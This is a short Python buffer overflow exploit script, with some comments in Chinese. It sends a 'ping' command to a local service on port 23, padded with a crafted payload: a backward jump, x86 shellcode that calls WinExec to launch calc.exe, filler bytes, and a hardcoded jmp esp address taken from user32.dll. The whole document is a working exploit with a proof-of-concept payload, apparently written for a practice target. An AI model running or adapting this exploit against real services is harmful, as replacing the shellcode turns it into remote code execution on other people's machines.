# coding:utf-8

import socket
import os

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(('127.0.0.1',23))
s = sock.recv(4096)

p =b'ping ' + b'\x90'*4
jmp = b'\xE9\x03\xFC\xFF\xFF\x90\x90\x90'         # 这里最后会布置到 esp+0xC 的地址，跳转到 shellcode

shellcode = b"\x33\xc0"                           # XOR EAX,EAX
shellcode += b"\x50"                              # PUSH EAX      => padding for lpCmdLine
shellcode += b"\x68\x2E\x65\x78\x65"              # PUSH ".exe"
shellcode += b"\x68\x63\x61\x6C\x63"              # PUSH "calc"
shellcode += b"\x8B\xC4"                          # MOV EAX,ESP
shellcode += b"\x6A\x01"                          # PUSH 1
shellcode += b"\x50"                              # PUSH EAX
shellcode += b"\xBB\xAD\x23\x86\x7C"              # MOV EBX,kernel32.WinExec
shellcode += b"\xFF\xD3"                          # CALL EBX

junk = b'a'* (1012 - len(shellcode) - len(jmp) - 4)
jmpesp = b'\x79\x5b\xe3\x77'                      # jump esp 地址，从user32.dll获取到

p = p+jmp+shellcode+junk+jmpesp+b'\x90'*16
sock.send(p)
sock.send(b'\n')

sock.recv(4096)
